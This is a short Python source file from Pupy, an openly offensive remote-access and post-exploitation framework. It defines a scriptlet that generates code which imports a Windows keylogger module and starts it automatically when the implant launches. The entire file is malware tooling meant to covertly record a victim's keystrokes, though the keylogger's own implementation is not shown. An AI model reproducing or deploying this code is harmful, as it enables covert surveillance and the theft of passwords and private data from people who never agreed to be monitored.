#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
import textwrap, random, string
from scriptlets import *

class ScriptletGenerator(Scriptlet):
    """ start the keylogger at startup """

    dependencies=[("windows/all/pupwinutils/keylogger.py","pupwinutils.keylogger")]
    arguments={}

    def generate(self):
        return textwrap.dedent("""
        import sys
        if sys.platform=="win32":
            import pupwinutils.keylogger
            pupwinutils.keylogger.keylogger_start()
        """)


